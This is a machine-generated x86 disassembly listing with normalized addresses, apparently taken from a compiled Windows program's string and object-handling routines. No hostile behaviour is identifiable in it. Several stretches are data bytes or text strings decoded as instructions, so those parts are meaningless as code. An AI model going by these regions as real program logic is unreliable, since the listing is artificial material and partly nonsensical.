mov edx [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xb8 ]
sub ecx eax
mov edx [ ebp - 0xb4 ]
cmp ecx edx
jae r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x154 ] edx
mov edx [ ebp - 0x154 ]
mov cl [ ebp - 0x14d ]
mov [ edx ] cl
mov edx [ ebp - 0x34 ]
cmp esi edx
jbe r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_4bbca8
pop ecx
cmp esi ecx
jbe r-xdata
mov edx [ ebp - 0xb4 ]
test edx edx
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xb8 ]
sub ecx eax
mov [ ebp - 0xb4 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x174 ] ecx
mov eax [ ebp - 0x174 ]
cmp eax 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x28 ]
push edx
call sub_4bc8cc
pop ecx
xor edx edx
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x170 ] eax
mov eax [ ebp - 0x170 ]
mov cl [ ebp - 0x169 ]
mov [ eax ] cl
mov eax [ ebp - 0x38 ]
test eax eax
jae r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x158 ] ecx
push ebx
push rw-data
mov eax [ ebp - 0x158 ]
push eax
call sub_4c4cb0
mov [ ebp - 0x159 ] 0x0
mov edx [ ebp - 0x34 ]
add esp 0xc
cmp edx 0x10
jb r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x58 ]
push eax
push esi
push edx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0xac ]
mov [ ebp - 0xd8 ] eax
mov edx [ ebp - 0x38 ]
test edx edx
jae r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xb8 ]
sub ecx eax
mov edx [ ebp - 0xb4 ]
sub ecx edx
mov [ ebp - 0xbc ] ecx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0x174 ] 0xffffffff
mov [ ebp - 0x38 ] ebx
add eax ebx
mov [ ebp - 0x160 ] eax
mov eax [ ebp - 0x160 ]
mov dl [ ebp - 0x159 ]
mov [ eax ] dl
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x111 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0xd8 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov edi [ ebp - 0x174 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x1bc ] eax
mov edx [ ebp - 0x1bc ]
cmp edx 0x1
ja r-xdata
mov [ ebp - 0x178 ] 0xffffffff
mov eax [ ebp - 0x174 ]
mov [ ebp - 0x17c ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x17c ]
cmp edx ecx
jae r-xdata
lea eax [ ebp - 0x58 ]
jmp r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebp - 0x11c ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xd8 ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0xd8 ] ecx
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xb8 ]
add eax edx
mov ecx [ ebp - 0xb4 ]
add eax ecx
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x1bc ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x17c ]
sub edx ecx
mov eax [ ebp - 0x178 ]
cmp edx eax
jae r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bc8cc
pop ecx
inc [ ebp - 0x78 ]
lea edx [ ebp - 0x30 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x78 ]
mov ecx rw-data
mov [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x168 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x168 ]
push ecx
lea eax [ ebp - 0x20 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x169 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x118 ] edx
mov edx [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ edx ] cl
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xd8 ]
sub edx ecx
mov [ ebp - 0xdc ] edx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xb8 ]
add edx eax
mov [ ebp - 0xc4 ] edx
mov ecx [ ebp - 0xbc ]
push ecx
mov eax [ ebp - 0xc0 ]
push eax
mov edx [ ebp - 0xc4 ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xb4 ]
sub ecx eax
add esp 0xc
mov [ ebp - 0xc8 ] ecx
mov edx [ ebp - 0xc8 ]
mov [ ebp - 0xcc ] edx
mov [ ebp - 0xcd ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x4 ]
cmp edi edx
jbe r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
mov eax [ ebp - 0x178 ]
test eax eax
jbe r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x17c ]
sub edx ecx
mov [ ebp - 0x178 ] edx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xac ]
add eax edx
mov [ ebp - 0x120 ] eax
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xcc ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0xd4 ]
mov cl [ ebp - 0xcd ]
mov [ eax ] cl
test edi edi
jne r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x28 ]
push eax
push edi
push edx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x19c ] eax
mov edx [ ebp - 0x8 ]
test edx edx
jae r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x17c ]
sub edx ecx
mov eax [ ebp - 0x178 ]
sub edx eax
mov [ ebp - 0x180 ] edx
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x11c ]
push edx
mov ecx [ ebp - 0x120 ]
push ecx
mov eax [ ebp - 0x124 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0xb0 ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x129 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xd8 ]
add edx eax
mov [ ebp - 0xe0 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1d5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x19c ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x128 ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x130 ]
mov cl [ ebp - 0x129 ]
mov [ eax ] cl
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0xe4 ] eax
mov edx [ ebp - 0xdc ]
push edx
mov ecx [ ebp - 0xe0 ]
push ecx
mov eax [ ebp - 0xe4 ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xd8 ]
sub edx ecx
add esp 0xc
mov [ ebp - 0xe8 ] edx
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0xec ] eax
mov [ ebp - 0xed ] 0x0
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
inc [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
mov eax rw-data
mov [ ebp - 0x30 ] eax
inc [ ebp - 0x78 ]
dec [ ebp - 0x78 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
mov edx [ ebp - 0x174 ]
mov [ ebp - 0x1e0 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x19c ] ecx
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x17c ]
add ecx eax
mov edx [ ebp - 0x178 ]
add ecx edx
mov [ ebp - 0x184 ] ecx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0xec ]
mov [ ebp - 0x38 ] eax
add ecx eax
mov [ ebp - 0xf4 ] ecx
mov edx [ ebp - 0xf4 ]
mov cl [ ebp - 0xed ]
mov [ edx ] cl
jmp r-xdata
mov ecx 0xf
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x1fd ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x1f8 ] ecx
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1fc ] eax
mov edx [ ebp - 0x1fc ]
push edx
call sub_4b0180
pop ecx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
add edx eax
mov [ ebp - 0x1dc ] edx
mov edx [ ebp - 0x1dc ]
mov cl [ ebp - 0x1d5 ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x19c ]
sub edx ecx
mov [ ebp - 0x1a0 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x17c ]
add edx eax
mov [ ebp - 0x188 ] edx
mov ecx [ ebp - 0x180 ]
push ecx
mov eax [ ebp - 0x184 ]
push eax
mov edx [ ebp - 0x188 ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x178 ]
sub ecx eax
add esp 0xc
mov [ ebp - 0x18c ] ecx
mov edx [ ebp - 0x18c ]
mov [ ebp - 0x190 ] edx
mov [ ebp - 0x191 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1e4 ] eax
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x190 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x198 ] eax
mov eax [ ebp - 0x198 ]
mov cl [ ebp - 0x191 ]
mov [ eax ] cl
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x204 ] edx
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x204 ]
mov cl [ ebp - 0x1fd ]
mov [ edx ] cl
mov [ ebp - 0x84 ] 0xc
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1e8 ] ecx
mov eax [ ebp - 0x1e0 ]
push eax
mov edx [ ebp - 0x1e4 ]
push edx
mov eax [ ebp - 0x1e8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x174 ]
mov [ ebp - 0x1ec ] edx
mov [ ebp - 0x1ed ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
add edx eax
mov [ ebp - 0x1a4 ] edx
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x1ec ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x1f4 ] eax
mov eax [ ebp - 0x1f4 ]
mov cl [ ebp - 0x1ed ]
mov [ eax ] cl
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1a8 ] eax
mov edx [ ebp - 0x1a0 ]
push edx
mov ecx [ ebp - 0x1a4 ]
push ecx
mov eax [ ebp - 0x1a8 ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x19c ]
sub edx ecx
add esp 0xc
mov [ ebp - 0x1ac ] edx
mov eax [ ebp - 0x1ac ]
mov [ ebp - 0x1b0 ] eax
mov [ ebp - 0x1b1 ] 0x0
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x1b8 ] ecx
mov edx [ ebp - 0x1b8 ]
mov cl [ ebp - 0x1b1 ]
mov [ edx ] cl
jmp r-xdata
sub_419954
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov eax 0x15555555
test eax eax
ja r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov eax 0x1
sub_419980
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x1c ] 0xc
mov ecx [ ebp + 0xc ]
cmp ebx ecx
je r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov esi ebx
mov eax [ ebp + 0x10 ]
mov edi eax
push edi
push 0xc
call sub_415614
add esp 0x8
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp + 0x10 ] 0xc
add ebx 0xc
mov edx [ ebp + 0xc ]
cmp ebx edx
jne r-xdata
mov [ ebp - 0x1c ] 0x30
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4d3050
inc [ ebp - 0x10 ]
lea edx [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_4d3050
inc [ ebp - 0x10 ]
lea edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x8
call sub_4d3050
inc [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xfffffffd
mov [ ebp - 0x1c ] 0x18
sub_419a1a
mov ecx [ ebp - 0x30 ]
mov eax [ ebp + 0x10 ]
cmp ecx eax
je r-xdata
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x1c ] 0x14
call sub_4d1d58
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
add [ ebp - 0x30 ] 0xc
mov ecx [ ebp - 0x30 ]
mov eax [ ebp + 0x10 ]
cmp ecx eax
jne r-xdata
dec [ ebp - 0x10 ]
mov edx 0x2
mov [ ebp - 0x1c ] 0x60
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
add eax 0x8
call sub_4d318c
dec [ ebp - 0x10 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
add eax 0x4
call sub_4d318c
dec [ ebp - 0x10 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4d318c
mov [ ebp - 0x1c ] 0x48
sub_419ab0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
mov eax ebx
mov edx esi
call sub_4d31b4
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_4d31b4
lea edx [ esi + 0x8 ]
lea eax [ ebx + 0x8 ]
call sub_4d31b4
add ebx 0xc
cmp edi ebx
jne r-xdata
sub_419af0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp edi eax
je r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub edi 0xc
mov esi edi
sub [ ebp + 0x10 ] 0xc
mov ebx [ ebp + 0x10 ]
mov edx esi
mov eax ebx
call sub_4d31b4
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_4d31b4
lea edx [ esi + 0x8 ]
lea eax [ ebx + 0x8 ]
call sub_4d31b4
mov ecx [ ebp + 0x8 ]
cmp edi ecx
jne r-xdata
sub_419b3c
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
rcr [ ecx + eax * 2 + 0x70415400 ] 0x1
jo r-xdata
and al 0x0
imul ebp [ esi + 0x6b ] 0x6d657449
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
add [ eax - 0x74aa6f70 ] dl
in al dx
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
sub_419c8b
inc [ ecx ]
add [ eax ] al
add [ eax ] cl
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
inc esp
imul esp [ ecx + 0x6c ] 0x676f
sub al 0x1d
inc eax
insb
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x54
inc ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
inc esp
imul esp [ ecx + 0x6c ] 0x3e676f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x3000003 ]
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x44000000 ] dh
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
add [ eax ] al
add [ edx ] dl
add [ eax ] al
add [ ebx * 4 + 0x30041 ] ch
pop eax
add [ ecx + eax * 2 + 0x70 ] dl
jo r-xdata
mov eax esi
call sub_401f40
imul ebp [ esi + 0x6b ] 0x6d657449
sub_419d94
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_419dec
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x380 ]
add eax 0x29c
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x380 ]
mov edx rw-data
mov [ ebp - 0x18 ] 0xc
add eax 0x29c
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xc ]
mov ecx [ eax ]
mov eax [ ebx ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x60 ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_419e68
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x2c ] 0xc
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call sub_4172ac
mov edx eax
mov [ ebp - 0x8 ] edx
mov eax edx
inc [ ebp - 0x20 ]
mov [ ebp - 0x2c ] 0x18
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x390 ]
test dl dl
je r-xdata
dec [ ebp - 0x20 ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov edx [ eax + 0x398 ]
mov eax [ ebx + 0x37c ]
call sub_48dfa0
mov [ ebp - 0x2c ] 0x18
mov eax [ ebp - 0x3c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
mov edi ebx
mov [ ebp - 0x18 ] edi
test edi edi
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x2c ] 0x3c
mov edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x2c ] 0x24
sub_419f2b
inc [ edi ]
add [ eax ] al
add [ eax + eax - 0x74 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x10041a1 ] bl
add [ eax + 0x64747300 ] dl
cmp bh [ edx ]
jne r-xdata
inc ecx
jo r-xdata
imul esi [ ecx + 0x75 ] 0x74705f65
jb r-xdata
xchg edx eax
or eax [ eax ]
inc ebx
add al 0xa2
inc ecx
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add al 0x10
add [ ebx + esi * 2 ] ah
inc ecx
add [ edx ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x70 ] dl
jo r-xdata
push esp
inc ecx
jo r-xdata
mov [ ebp - 0x28 ] 0x18
xor eax eax
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
inc [ ebp - 0x1c ]
mov eax [ ebx + 0x37c ]
call sub_48df68
lea edx [ ebp - 0xc ]
push edx
mov edx rw-data
lea eax [ ebp - 0x10 ]
call sub_4d3010
inc [ ebp - 0x1c ]
lea edx [ ebp - 0x10 ]
pop eax
call sub_4d324c
push eax
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax [ rw-data ]
push 0x0
mov ecx rw-data
mov edx esi
mov eax [ eax ]
call sub_4826f8
mov ecx [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
inc ebp
clc
jne r-xdata
push eax
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
add bh bh
inc ebp
in al 0x8d
push ebp
cld
popad
jo r-xdata
mov eax [ ebx + 0x378 ]
call sub_48df68
lea edx [ ebp - 0x4 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
pop eax
call sub_4d324c
and [ bp + si ] ch
inc ebx
popad
jo r-xdata
mov esi [ ebx + 0x380 ]
xor eax eax
mov [ ebp - 0x28 ] 0x30
mov [ ebp - 0x14 ] eax
add esi 0x29c
inc [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x380 ]
call sub_48df68
mov eax [ esi ]
lea edx [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ edx ]
call [ ecx + 0x54 ]
mov esi eax
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x28 ] 0x24
dec esi
jge r-xdata
mov eax [ rw-data ]
push 0x0
mov ecx rw-data
mov edx edi
mov eax [ eax ]
call sub_4826f8
mov ecx [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop ebx
xor bl [ ebp ]
nop
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
push ebp
mov ebp esp
jne r-xdata
mov [ ebx + 0x2a4 ] 0x1
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
push 0x1
mov edx [ ebp - 0x3c ]
mov ecx rw-data
mov eax [ eax ]
call sub_4826f8
cmp eax 0x2
jne r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x732c676f
je r-xdata
mov ecx [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
pop ebp
add [ eax - 0x7c1374ab ] dl
cmp bh [ edx ]
popa
jne r-xdata
0x8be8004d 0xab1
je r-xdata
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x3c ] rw-data
mov [ ebp - 0x28 ] 0xc
in al dx
insb
